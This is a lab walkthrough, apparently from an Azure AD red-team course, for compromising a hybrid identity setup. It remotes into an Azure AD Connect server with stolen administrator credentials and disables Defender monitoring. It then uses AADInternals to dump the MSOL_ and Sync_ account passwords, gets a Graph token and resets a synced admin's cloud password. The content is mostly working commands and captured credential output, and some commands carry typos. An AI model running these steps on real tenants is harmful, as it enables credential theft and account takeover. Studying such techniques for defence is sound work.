## Objective 24 ***Part of - Kill Chain - 1***

```
- Use the credentials for administrator of Azure AD connect that you compromised earlier and extract the credentials of MSOL_* and Sync_* account from the AD Connect server of defeng.corp
- Use the above credentials to compromise the user onpremadmin synced to defcorpsecure.onmicrosoft.com tenant.
```
- Recall that we extracted credentials for defeng-adcnct\administrator from Powershell history of a user from the `bkapadconnect VM`. we also compromised defeng-adcsrv by abusing the automation account 'Hybridautomation`

Use the credentials extracted from bkpadconnect on the defeng-adcnct server
```powershell
$password = ConvertTo-SecureString 'CredsToManageCl0udSync!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('administrator', $password) PS C:\AzAD\Tools> $adcnct = New-PSSession -ComputerName 172.16.1.21 -Credential $creds
Enter-PSSession $adcnct
```

- Check if Azure AD connect is installed on defeng-adcnct
```powershell
Get-ADSyncConnector
```

- So the on-prem defeng.corp is synced to defcorpsecure.onmicrosoft.com using **`PHS`** and we are on the server where Azure AD connect is installed – defeng-adcnct. 
![test](/img/obj24.png "Enumeration")

- Load the AADInternals module in the PSRemtoing session and extract credentials for the Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com that can then be used to reset password for any user in the cloud:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Copy-Item -ToSession $adcnct -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
Enter-PSSession $adcnct
Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
```
Extracted credentials;
```
ADDomain : DEFENG.CORP
ADUser : MSOL_782bef6aa0a9
ADUserPassword : Y#;lq1Wkiz*^o%Zx)WN.d[Bgvr[snip]
AADUser : Sync_DEFENGADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com
AADUserPassword : {_d*[snip]
```

- Use the credentials of the Sync_* account to request an access token for AADGraph API and save it to cache:
```powershell
$passwd = ConvertToSecureString 'password' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_DEFENGADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd)
GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
```
- Get the ImmutableId for the onpremadmin user
```powershell
Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
```
- Reset the onpremadmin user's password using the below command:
```powershell
Set-AADIntUserPassword -SourceAnchor "E2gG19HA4EaDe0+3LkcS5g==" -Password "SuperSecretpass#12321" –Verbose
```
